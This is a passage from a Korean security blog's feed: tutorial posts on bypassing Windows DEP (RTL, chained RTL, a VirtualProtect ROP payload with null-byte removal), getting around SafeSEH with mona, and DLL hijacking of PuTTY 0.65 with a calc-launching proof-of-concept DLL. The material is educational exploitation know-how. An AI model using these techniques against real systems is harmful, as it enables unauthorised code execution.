&lt;p&gt;아래와 같이 example.dll의 IAT를 살펴보면 우리가 사용하고자 하는 VirtualProtect() 함수의 정보가 들어있는 것을 확인하실 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이렇게 VirtualProtect() 정보가 들어 있는 경우에는 IAT 값에서 시작 주소를 가져다가 쓰면 되는 것이죠.&lt;/p&gt;

&lt;p&gt;없다면? 동적으로 찾아오도록 Gadget을 구성하면 됩니다.&lt;/p&gt;

&lt;h5 id=&quot;null-byte-제거&quot;&gt;Null Byte 제거&lt;/h5&gt;

&lt;p&gt;공격을 성공적으로 하기 위해 Payload에 존재하는 Null Byte들을 제거해줘야겠죠?&lt;/p&gt;

&lt;p&gt;mona가 만들어 준 값들엔 Null Byte가 존재해서 Payload 전달이 완전하게 이루어지지 않는답니다.&lt;/p&gt;

&lt;p&gt;그래서 다음과 같이 수정을 했습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 0x201, 0x40 같은 값을 넣어줘야 하는데 Null이 존재하므로 0xfffffdff, 0xffffffc0를 넣고 neg를 사용해서 값을 생성해줬습니다.&lt;/p&gt;

&lt;p&gt;그리고 Gadget 주소 중에 Null이 존재하는 것은 다른 Gadget 찾아서 교체해준 내용입니다.&lt;/p&gt;

&lt;p&gt;mona만 믿고 Payload를 구성하시면 안됩니다. 잘 살펴보고 Null은 반드시 제거해주셔야 합니다.&lt;/p&gt;

&lt;p&gt;이어서 DBG로 살펴보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;strcpy가 실행되고 나서의 모습입니다. 각 Gadget들이 연속해서 실행된 뒤, VirtualProtect() 함수가 실행될 것이고,&lt;/p&gt;

&lt;p&gt;마지막에 JMP ESP가 실행되면서 ShellCode가 실행되겠네요.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x09_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행되네요^^&lt;/p&gt;

&lt;p&gt;지금까지 DEP에 대해서 알아봤습니다.&lt;/p&gt;

&lt;p&gt;다음 연재부터는 Heap Exploit으로 찾아뵙도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x09 DEP(3)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x08</title>
      <link href="http://localhost:4000/windows-0x08" rel="alternate" type="text/html" title="windows-0x08" />
      <published>2019-03-19T20:18:00+09:00</published>
      <updated>2019-03-19T20:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x08</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x08">&lt;h1 id=&quot;0x08-dep2&quot;&gt;0x08 DEP(2)&lt;/h1&gt;

&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;

&lt;p&gt;지난 Post에서 RTL을 다루어 봤습니다.&lt;/p&gt;

&lt;p&gt;이번 시간에는 RTL에 이어 Chaining RTL에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;chaining-rtl&quot;&gt;Chaining RTL&lt;/h5&gt;

&lt;p&gt;Chaining RTL은 RTL이 Chain처럼 엮여서 반복되는 것을 말합니다.&lt;/p&gt;

&lt;p&gt;RTL이 뭐였죠? DEP가 적용되어 Shellcode를 실행할 수 없게 되었을 때, 라이브러리 함수로 점프하여&lt;/p&gt;

&lt;p&gt;내가 원하는 함수를 실행하는 것이었죠?&lt;/p&gt;

&lt;p&gt;Chaining RTL은 말 그대로 내가 원하는 함수를 계속해서 실행하는 것을 뜻합니다.&lt;/p&gt;

&lt;p&gt;의미는 알았으니, 본격적으로 알아볼텐데 STACK 구성에 집중해서 보시면 되겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, 지난 시간처럼 몇 가지 가정을 하겠습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;func1(argv1) : 인자를 하나만 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func2(argv1’, argv’2) : 인자를 두 개 필요로 하는 함수&lt;/li&gt;
  &lt;li&gt;func3(argv’‘1, argv’‘2, argv’‘3) : 인자를 세 개 필요로 하는 함수&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이 함수들을 차례대로 호출한다고 가정하고 이 때, Payload를 어떻게 구성해야하는 것인지를 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 그림 기억나시나요?? 지난 시간에 살펴봤던 함수를 하나만 호출할 때의 STACK 그림입니다.&lt;/p&gt;

&lt;p&gt;Main-ret가 다음 호출할 함수의 SFP로 변경되고 있죠? 그래서 그 다음 4 Byte가 호출된 함수가 종료되고 다음에 갈 곳의 주소인 것도 알고 있습니다.&lt;/p&gt;

&lt;p&gt;그럼 두 번째 함수(인자가 두 개)를 호출할 때 그림이 이렇게 되겠네요?&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_1.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Func1() 함수의 RET 자리에 Func2() 함수의 주소를 넣어줬습니다. 그럼 Func1() 함수가 종료된 후, Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;간단하죠?&lt;/p&gt;

&lt;p&gt;그런데 여기엔 문제가 있습니다. 이 방법으로는 내가 원하는 함수를 마음껏 호출할 수가 없습니다.&lt;/p&gt;

&lt;p&gt;그냥 RET에 다른 함수 주소를 덮어주면 되는거 아니야? 라고 생각하실 수 있습니다.&lt;/p&gt;

&lt;p&gt;자, 그럼 다음에 Func3() 함수를 호출한다고 생각해봅시다.&lt;/p&gt;

&lt;p&gt;Func3() 함수의 주소는 어디에 넣어줘야 하죠?&lt;/p&gt;

&lt;p&gt;이미 Func1() 함수의 첫 번째 인자가 위치하고 있습니다. 이제 이해가 가시죠??&lt;/p&gt;

&lt;p&gt;이 한계를 해결하기 위해 지금부터는 Gadget을 사용할 겁니다.&lt;/p&gt;

&lt;p&gt;RET로 끝나는 많고 많은 Gadget 중에 시스템 해킹에서 주로 사용되는 Gadget은 다음 3가지 입니다.
(이것만 쓴다는 게 아닙니다!!)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;pr : POP RET&lt;/li&gt;
  &lt;li&gt;ppr : POP POP RET&lt;/li&gt;
  &lt;li&gt;pppr : POP POP POP RET&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;POP 뒤에 Operand는 생략했습니다.&lt;/p&gt;

&lt;p&gt;이 Gadget을 이용해서 내가 원하는만큼 함수를 호출하려면 STACK을 다음과 같이 구성하면 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_2.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;조금 이상하고 복잡한 듯이 느껴질 수 있는데, 에필로그 과정부터 Gadget 순으로 색깔별로 보시면 됩니다.&lt;/p&gt;

&lt;p&gt;먼저 에필로그부터 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;RETN이 실행되면 POP EIP, JMP EIP를 수행하므로 실행되고 난 후, ESP의 위치는 빨간 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;JMP EIP가 실행되면 POP RETN이 실행되겠죠?&lt;/p&gt;

&lt;p&gt;처음 POP이 실행되면 STACK 최상단의 값을 꺼내고 ESP가 올라가면서 ESP의 위치는 파란 ESP 위치가 됩니다.&lt;/p&gt;

&lt;p&gt;다시 RETN이 실행되면 POP EIP, JMP EIP가 실행되겠네요.&lt;/p&gt;

&lt;p&gt;그럼 그 때의 ESP는 초록색 위치가 되는데 POP EIP를 했으므로 EIP엔 두 번째 함수 Func2()의 주소가 들어가게 될 것이고&lt;/p&gt;

&lt;p&gt;JMP EIP를 하면서 Func2() 함수가 실행됩니다.&lt;/p&gt;

&lt;p&gt;세 번째 함수까지 모두 호출한다고 가정했을 때, STACK의 구조는 다음과 같이 됩니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x08_3.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이런 식으로 STACK을 구성해서 내가 원하는 함수를 계속해서 호출하는 기법을 Chaining RTL이라고 부릅니다.&lt;/p&gt;

&lt;p&gt;자, 이제 ROP를 하기 위한 기초 준비 작업을 모두 마쳤습니다.&lt;/p&gt;

&lt;p&gt;다음 Post에서 ROP를 알아보고 DEP편을 마무리 짓도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x08 DEP(2)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x07</title>
      <link href="http://localhost:4000/windows-0x07" rel="alternate" type="text/html" title="windows-0x07" />
      <published>2019-03-19T19:18:00+09:00</published>
      <updated>2019-03-19T19:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x07</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x07">&lt;h1 id=&quot;0x07-dep1&quot;&gt;0x07 DEP(1)&lt;/h1&gt;

&lt;h5 id=&quot;what-is-dep&quot;&gt;What is DEP?&lt;/h5&gt;

&lt;p&gt;DEP는 특정 메모리의 실행 권한을 제거하여, 메모리에 올라온 Shellcode의 실행을 막는 메모리 보호 기법입니다.&lt;/p&gt;

&lt;p&gt;DEP는 Window XP Service Pack 2에서부터 적용된 기법이며, H/W 기반 DEP와 S/W 기반 DEP로 나눌 수 있습니다.&lt;/p&gt;

&lt;p&gt;이 두 가지 방식의 차이는 CPU가 하드웨어적으로 DEP를 지원 가능한가를 기준으로 나뉜다고 생각하시면 됩니다.&lt;/p&gt;

&lt;p&gt;CPU에서 지원 가능한 경우 H/W DEP라 하고, 그렇지 않은 경우 S/W로 그 기능을 지원하는 방식인 것이죠.&lt;/p&gt;

&lt;p&gt;최근 나온 CPU들은 대부분 H/W 기능을 지원하므로 일반적으로 DEP라고 하면 H/W DEP라고 생각하시면 됩니다.&lt;/p&gt;

&lt;p&gt;DEP에는 아래와 같이 4가지 종류의 옵션이 존재합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OptIn : 지정된 Binary만 보호&lt;/li&gt;
  &lt;li&gt;OptOut : 지정된 Binary를 제외하고 보호&lt;/li&gt;
  &lt;li&gt;AlwaysOn : 모든 Process 항상 보호&lt;/li&gt;
  &lt;li&gt;AlwaysOff : 모든 Process 보호하지 않음&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OS를 설치한 후, 직접 변경한 적이 없다면 Default로 OptIn 옵션이 적용되어 있고 다음과 같이 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;DEP가 적용되면 Shellcode를 STACK에 넣어서 실행해왔던 지금까지의 방법으로는 성공할 수가 없게 됩니다.&lt;/p&gt;

&lt;p&gt;하지만 이 기법 역시 우회가 가능하며, DEP를 우회하기 위해 필요한 기법과 개념들은 다음과 같습니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Gadget&lt;/li&gt;
  &lt;li&gt;RTL&lt;/li&gt;
  &lt;li&gt;Chaining RTL&lt;/li&gt;
  &lt;li&gt;ROP&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;지금부터 하나씩 살펴보겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;gadget&quot;&gt;Gadget&lt;/h5&gt;

&lt;p&gt;Gadget이란 “mov esp, ebp” 등의 명령어 조각을 의미했었습니다.&lt;/p&gt;

&lt;p&gt;하지만 지금 시스템 해킹에서의 Gadget은 RET로 끝나는 명령어 조각을 의미하게 되었습니다.&lt;/p&gt;

&lt;p&gt;이 Gadget이 공격에서 왜 중요한지는 Chaining RTL과 ROP를 다루면서 이야기하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;rtl&quot;&gt;RTL&lt;/h5&gt;

&lt;p&gt;RTL은 Return to Library의 약자로 해석을 하면 Library로 돌아간다는 의미입니다.&lt;/p&gt;

&lt;p&gt;Library로 돌아간다?&lt;/p&gt;

&lt;p&gt;아까 앞에서 DEP가 적용되면 Shellcode를 실행할 수가 없다고 했었던 것 기억나시죠?&lt;/p&gt;

&lt;p&gt;그래서 RET를 Shellcode의 주소로 변조하는 것이 아니라, 실행 권한이 있을 수 밖에 없는 Library의 함수의 주소로 변조하는 것이죠.&lt;/p&gt;

&lt;p&gt;그리고!!!&lt;/p&gt;

&lt;p&gt;RTL에서 가장 중요한 것은 함수의 인자를 직접 생성해야 한다는 것입니다.&lt;/p&gt;

&lt;p&gt;Shellcode를 실행했을 때와는 다르게 이 방법은 RET 주소를 원하는 함수의 주소로 바꿔줬을 뿐이기 때문이죠.&lt;/p&gt;

&lt;p&gt;그 함수가 실행되기 위해서는 함수의 동작에 필요한 인자들이 있어야하겠죠?&lt;/p&gt;

&lt;p&gt;CPU가 알아서 자동으로 만들어 줄리가 없으니,,STACK에 직접 구성해줘야 합니다.&lt;/p&gt;

&lt;p&gt;인자를 1개만 취하는 함수 Func()가 있다고 가정하겠습니다.&lt;/p&gt;

&lt;p&gt;RTL 기법으로 이 함수를 호출하기 위해서는 STACK을 다음과 같이 구성해야 합니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림에서 중간 STACK 그림을 보면 Func을 호출하기 위해 RET를 Func 함수의 주소로 변조하고, 그 위치에서 +8만큼 떨어진 곳에 함수의 인자를 구성한 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;그런데 왜 인자의 위치를 저렇게 구성해줘야 할까요?&lt;/p&gt;

&lt;p&gt;다음 그림을 보면서 설명해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;빨간 색으로 표시된 부분은 Main 함수의 에필로그 과정, 파란 색으로 표신된 부분은 Func 함수의 프롤로그 과정을 나타낸 것 입니다.&lt;/p&gt;

&lt;p&gt;먼저, 빨간 색. Main 함수의 에필로그 과정을 봅시다.&lt;/p&gt;

&lt;p&gt;POP EIP, JMP EIP를 코드를 수행했을 때의 위치가 가장 왼쪽 STACK에 표시된 ESP가 가르키는 곳 입니다.&lt;/p&gt;

&lt;p&gt;이후, JMP EIP 코드가 실행되면 새로운 함수가 실행되고 새 함수의 프롤로그 과정이 진행됩니다.&lt;/p&gt;

&lt;p&gt;프롤로그 과정의 일부인 PUSH EBP가 실행되면 새 STACK Frame의 기준점을 만듭니다.&lt;/p&gt;

&lt;p&gt;여기까지 진행된 후, STACK을 살펴봅시다.&lt;/p&gt;

&lt;p&gt;Main 함수의 RET가 뒤이어 실행되는 함수의 SFP 자리로 바뀐다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 그 다음에, RET를 만들어주었습니다.&lt;/p&gt;

&lt;p&gt;RTL이 아니라 정상적인 방식인 CALL을 통해 함수가 실행된다면 STACK에 다음에 실행할 곳의 위치를 넣어줍니다.&lt;/p&gt;

&lt;p&gt;그런데 우리는 컴파일러가 만들어주는 것이 아니기 때문에 직접 만들어줘야 합니다.&lt;/p&gt;

&lt;p&gt;그래서 저 위치에 다음에 실행할 곳의 주소 역할을 할 값을 직접 넣어 구성해주는 것 입니다.&lt;/p&gt;

&lt;p&gt;쉽게 생각하면 컴파일러가 만들어주는 구조를 똑같이 흉내낸다고 생각하시면 되겠습니다.&lt;/p&gt;

&lt;p&gt;이것이 RTL의 전부입니다.&lt;/p&gt;

&lt;p&gt;다음은 디버거를 통해 RTL을 진행한 그림입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x07_5.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;잘 실행이 되네요^^&lt;/p&gt;

&lt;p&gt;그런데 이 방식은 실제 환경에서는 거의 불가능한 방법이라는 것도 알아두셔야 합니다.&lt;/p&gt;

&lt;p&gt;실제 환경에서는 ASLR, Safe SEH 등이 기본적으로 적용되어 있기 때문에 내가 원하는 함수의 주소를 찾아내기 힘들기 때문입니다.&lt;/p&gt;

&lt;p&gt;그래서 이 기법은 ROP를 위한 기본 개념 정도로만 이해하시기 바랍니다.&lt;/p&gt;

&lt;p&gt;글이 너무 길어졌네요. 이만 줄이고 다음 편에서 ROP를 알아보도록 하겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x07 DEP(1)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">windows-0x06</title>
      <link href="http://localhost:4000/windows-0x06" rel="alternate" type="text/html" title="windows-0x06" />
      <published>2019-03-18T19:18:00+09:00</published>
      <updated>2019-03-18T19:18:00+09:00</updated>
      <id>http://localhost:4000/windows-0x06</id>
      <content type="html" xml:base="http://localhost:4000/windows-0x06">&lt;h1 id=&quot;0x06-gs2&quot;&gt;0x06 GS(2)&lt;/h1&gt;

&lt;h5 id=&quot;safeseh&quot;&gt;SafeSEH&lt;/h5&gt;

&lt;p&gt;SafeSEH는 SEH Overwite를 방어하기 위해 도입된 메모리 보호 기법입니다.&lt;/p&gt;

&lt;p&gt;SafeSEH가 하는 일은 아주 간단합니다.&lt;/p&gt;

&lt;p&gt;Exception Handler가 실행되기 전에 Handler 주소 값에 대한 검증을 수행합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1) 등록된 Handler의 주소가 STACK인지 확인해서 STACK이면 호출하지 않음.&lt;/li&gt;
  &lt;li&gt;2) Handler의 주소가 현재 로드된 모듈의 주소이고, SafeSEH 컴파일이 되어 있다면 적절한 절차로 등록된 것인지 검증.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;까다롭죠??&lt;/p&gt;

&lt;p&gt;그런데 해법이 상당이 간단합니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;1) Handler의 주소가 STACK이 아니면 된다.&lt;/li&gt;
  &lt;li&gt;2) SafeSEH 컴파일이 되어 있지 않으면 된다.&lt;/li&gt;
  &lt;li&gt;결론 : SafeSEH가 안걸려 있는 모듈에서 Gadget을 찾아오면 된다!!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;간단하죠?&lt;/p&gt;

&lt;p&gt;Immunity Debugger에서 mona.py를 이용하면 Module들에 어떤 보호기법들이 적용되어 있는지 확인할 수 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona modules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x06_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 중에 SafeSEH가 적용되어 있지 않은 Module을 골라서 우회 공격을 동일하게 진행하면 됩니다.&lt;/p&gt;

&lt;p&gt;이상으로 GS편을 모두 마치겠습니다.&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">0x06 GS(2)</summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">DLL Hijacking &amp;amp; Ghidra</title>
      <link href="http://localhost:4000/Dll-Hijacking-&-Ghidra" rel="alternate" type="text/html" title="DLL Hijacking &amp; Ghidra" />
      <published>2019-03-17T19:18:00+09:00</published>
      <updated>2019-03-17T19:18:00+09:00</updated>
      <id>http://localhost:4000/Dll%20Hijacking%20&amp;%20Ghidra</id>
      <content type="html" xml:base="http://localhost:4000/Dll-Hijacking-&amp;-Ghidra">&lt;h1 id=&quot;dll-hijacking--ghidra&quot;&gt;DLL Hijacking &amp;amp; Ghidra&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;방구석에 누워있다 갑자기 DLL Hijacking 포스팅을 올리라는 일거리를 받아서 글을 쓰게 되었습니다. 허허..&lt;/p&gt;

&lt;h5 id=&quot;overview&quot;&gt;Overview&lt;/h5&gt;

&lt;p&gt;DLL Hijacking은 PE 프로그램이 의도하지 않은 external library(dll)을 실행하도록 만드는 것 입니다. 
이 공격은 DLL Search Order 때문에 취약한 PE 프로그램이 공격자가 작성한 DLL을 로드하고 실행하게 됩니다.
지금부터, 취약한 프로그램 분석과 Hijacking할 dll을 찾는 과정 등을 하나씩 살펴보도록 하겠습니다.&lt;/p&gt;

&lt;p&gt;먼저, 오늘 포스팅에서 사용한 Tool과 환경구축 내용입니다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Ghidra (jdk 11 이상, 64bit 필수)&lt;/li&gt;
  &lt;li&gt;PuTTY 0.65&lt;/li&gt;
  &lt;li&gt;Sysinternals suite&lt;/li&gt;
  &lt;li&gt;Visual Studio 2017&lt;/li&gt;
&lt;/ul&gt;

&lt;h5 id=&quot;find-the-dlls-which-are-loaded-by-target-application&quot;&gt;Find the dlls which are loaded by target application.&lt;/h5&gt;

&lt;h6 id=&quot;procexp&quot;&gt;Procexp&lt;/h6&gt;

&lt;p&gt;PuTTY 0.65를 실행한 뒤, Sysinternals의 Procexp.exe를 통해 어떤 dll들을 사용하는지 확인해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Procexp.exe에서 [View]-[Lower Pane View]-[DLLs] 설정을 하면 PuTTY 프로그램이 로드한 dll 목록들을 확인할 수 있습니다.
그런데 이것만 가지고는 어떤 dll을 hijack할 수 있는지 알 수가 없습니다. 결과만 보이기 때문이죠.&lt;/p&gt;

&lt;p&gt;그래서 이번에는 Sysinternals의 Procmon을 실행시켜서 dll이 로드되는 과정을 살펴보겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;procmon&quot;&gt;Procmon&lt;/h6&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_3.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Procmon을 실행한 후 필터를 위와 같이 설정합니다. 그럼 아래와 같이 PuTTY가 dll을 로드하는 과정에서 발생한 내용들을 볼 수가 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_4.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 그림과 Procexp의 내용을 종합해보면 PuTTY는 WINMM.dll을 자신이 있는 디렉터리에서 먼저 찾아서 로드하려고 한다는 것을 알 수 있습니다.&lt;/p&gt;

&lt;p&gt;하지만 해당 디렉터리에는 WINMM.dll이 없기에 결과적으로는 C:\Windows\SysWOW64\WINMM.dll을 로드하고 있습니다.&lt;/p&gt;

&lt;p&gt;만약 해당 디렉터리에 이 WINMM.dll이 존재한다면 어떻게 될까요? ^^&lt;/p&gt;

&lt;p&gt;아 물론, 여기서 해당 디렉터리에 low priv user가 Write Access가 가능하다는 전제하에 진행하는 것입니다.&lt;/p&gt;

&lt;p&gt;만약, 해당 디렉터리가 C:\, C:\Program Files 등 Admin 권한이 필요한 경우에는 UAC 팝업이 뜨겠죠?&lt;/p&gt;

&lt;p&gt;UAC 팝업은 쉽게 우회가 가능하나, 이 글의 범위를 넘어서므로 바탕화면 특정 디렉터리에서 진행합니다.&lt;/p&gt;

&lt;p&gt;계속 갑니닷.&lt;/p&gt;

&lt;h6 id=&quot;find-a-target-function-with-ghidra&quot;&gt;Find a Target Function with Ghidra&lt;/h6&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_5.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;Target Function을 Ghidra를 이용해서 찾아보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_1.png&quot; alt=&quot;[그림 1-5]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;[Symbol Tree] - [Imports] - [WINMM.dll]을 따라가면 PlaySoundA라는 함수를 찾을 수 있습니다. 쉽죠??&lt;/p&gt;

&lt;p&gt;그럼 이제 우리가 해야할 일은 Hijacking에 사용할 dll을 만드는 것 입니다.&lt;/p&gt;

&lt;h6 id=&quot;make-a-dll&quot;&gt;Make a DLL&lt;/h6&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &quot;stdafx.h&quot;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {

	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
		WinExec(&quot;calc&quot;, SW_NORMAL);
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;

	}
	return true;
}

extern &quot;C&quot; __declspec(dllexport) void PlaySoundA() {
	WinExec(&quot;calc&quot;, SW_NORMAL);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위와 같이 PuTTY가 실행될 때 계산기를 실행하도록 새로운 dll을 생성했습니다.&lt;/p&gt;

&lt;h6 id=&quot;execute-target-program&quot;&gt;Execute Target Program&lt;/h6&gt;

&lt;p&gt;아래와 같이, 같은 디렉터리에 방금 만든 dll을 위치시킨 후, 실행해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/dll/0x00_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;계산기가 잘 실행되네요. ^^&lt;/p&gt;

&lt;p&gt;지금까지 DLL Hijacking에 대해서 알아봤습니다. 뿅!&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Joel Park</name>
        
        
      </author>

      

      
        <category term="Posts" />
      

      
        <summary type="html">DLL Hijacking &amp;amp; Ghidra</summary>
      

      
      
    </entry>
  
</feed>
